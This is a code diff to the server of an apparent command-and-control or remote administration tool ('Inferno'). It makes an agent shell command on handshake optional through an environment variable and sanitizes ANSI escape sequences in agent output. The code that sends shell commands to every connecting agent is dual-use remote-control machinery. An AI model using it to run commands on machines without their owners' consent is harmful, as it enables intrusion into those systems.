@@ -154,16 +154,22 @@ void Server::processPacketBuffer(ClientContext& client) {
             Packet req(static_cast<uint16_t>(Opcode::PROC_LIST_REQ), "");
             client.socket.sendData(req.serialize());
 
-            // Also trigger test shell command (temporary — driven by Qt GUI in Circle 4)
-            const std::string cmd = "whoami";
-            std::vector<uint8_t> cmd_payload;
-            const uint16_t cmd_len = static_cast<uint16_t>(cmd.size());
-            cmd_payload.push_back(static_cast<uint8_t>((cmd_len >> 8) & 0xFF));
-            cmd_payload.push_back(static_cast<uint8_t>(cmd_len & 0xFF));
-            cmd_payload.insert(cmd_payload.end(), cmd.begin(), cmd.end());
-            Packet cmd_req(static_cast<uint16_t>(Opcode::CMD_EXEC),
-                           std::string(cmd_payload.begin(), cmd_payload.end()));
-            client.socket.sendData(cmd_req.serialize());
+            // Test-only bootstrap command — disabled by default.
+            // Set INFERNO_BOOTSTRAP_CMD=<cmd> before launching the server to trigger
+            // a shell command on every agent handshake (for integration testing only).
+            // In Circle 4 this entire block is replaced by the Qt GUI operator interface.
+            const char* bootstrap_cmd = std::getenv("INFERNO_BOOTSTRAP_CMD");
+            if (bootstrap_cmd && *bootstrap_cmd) {
+                const std::string cmd(bootstrap_cmd);
+                std::vector<uint8_t> cmd_payload;
+                const uint16_t cmd_len = static_cast<uint16_t>(cmd.size());
+                cmd_payload.push_back(static_cast<uint8_t>((cmd_len >> 8) & 0xFF));
+                cmd_payload.push_back(static_cast<uint8_t>(cmd_len & 0xFF));
+                cmd_payload.insert(cmd_payload.end(), cmd.begin(), cmd.end());
+                Packet cmd_req(static_cast<uint16_t>(Opcode::CMD_EXEC),
+                               std::string(cmd_payload.begin(), cmd_payload.end()));
+                client.socket.sendData(cmd_req.serialize());
+            }
 
         } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_RES)) {
             printProcessList(client.socket.getIp(), payload_str);
@@ -220,6 +226,24 @@ void Server::printShellOutput(const std::string& ip, const std::string& payload)
     // CMD_RES layout: [status: uint8][data_len: uint16][data: char[]]
     if (payload.size() < 3) return;
 
+    // Sanitize output before printing to the operator's terminal.
+    // A compromised agent could embed ANSI escape sequences (e.g. \x1b[2J to clear the
+    // screen, or \x1b]0; to change the terminal title) to manipulate the operator's view.
+    // This filter strips all control characters except whitespace (\n, \r, \t) and
+    // printable ASCII (0x20–0x7E). Raw bytes on the wire are NOT affected.
+    // NOTE: In Circle 5, raw bytes will be stored unmodified in the PostgreSQL database.
+    auto sanitize = [](const std::string& s, size_t offset, size_t len) -> std::string {
+        std::string out;
+        out.reserve(len);
+        for (size_t i = offset; i < offset + len && i < s.size(); ++i) {
+            const unsigned char c = static_cast<unsigned char>(s[i]);
+            if (c == '\n' || c == '\r' || c == '\t' || (c >= 0x20 && c != 0x7F)) {
+                out.push_back(static_cast<char>(c));
+            }
+        }
+        return out;
+    };
+
     const uint8_t  status   = static_cast<uint8_t>(payload[0]);
     const uint16_t data_len = (static_cast<uint16_t>(static_cast<uint8_t>(payload[1])) << 8)
                             |  static_cast<uint16_t>(static_cast<uint8_t>(payload[2]));
@@ -227,12 +251,12 @@ void Server::printShellOutput(const std::string& ip, const std::string& payload)
     if (status == 0) {
         // Data chunk — print directly without separator
         if (payload.size() >= static_cast<size_t>(3 + data_len)) {
-            std::cout << payload.substr(3, data_len) << std::flush;
+            std::cout << sanitize(payload, 3, data_len) << std::flush;
         }
     } else if (status == 1) {
         // Last chunk — flush any remaining data, then print separator
         if (data_len > 0 && payload.size() >= static_cast<size_t>(3 + data_len)) {
-            std::cout << payload.substr(3, data_len);
+            std::cout << sanitize(payload, 3, data_len);
         }
         std::cout << "\n" << std::setfill('-') << std::setw(60) << ""
                   << "\n[Server] Shell command from " << ip << " completed.\n"
@@ -240,7 +264,7 @@ void Server::printShellOutput(const std::string& ip, const std::string& payload)
     } else {
         // status == 2: error
         std::cerr << "[Server] Shell error from " << ip << ": "
-                  << payload.substr(3, data_len) << std::endl;
+                  << sanitize(payload, 3, data_len) << std::endl;
     }
 }
 
